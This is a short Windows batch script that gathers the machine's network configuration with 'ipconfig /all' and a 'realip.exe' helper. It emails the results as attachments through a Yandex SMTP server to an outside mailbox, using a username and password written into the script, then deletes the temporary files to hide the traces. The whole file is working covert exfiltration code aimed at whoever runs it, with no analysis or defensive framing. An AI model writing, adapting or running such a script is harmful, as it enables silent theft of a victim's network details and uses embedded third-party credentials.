@echo off

ipconfig /all > localip.txt
realip.exe > realip.txt

ping -n 2 127.0.0.1 > nul

blat.exe -install -server smtp.yandex.ru -port 25 -f the.loggs@ya.ru -u the.loggs -pw loggs1234
blat.exe -to the.loggs@ya.ru -subject "Local IP" -attachi "localip.txt" -body "Locals IP"
blat.exe -to the.loggs@ya.ru -subject "Real IP" -attachi "realip.txt" -body "Real IP"

del /f /q localip.txt
del /f /q realip.txt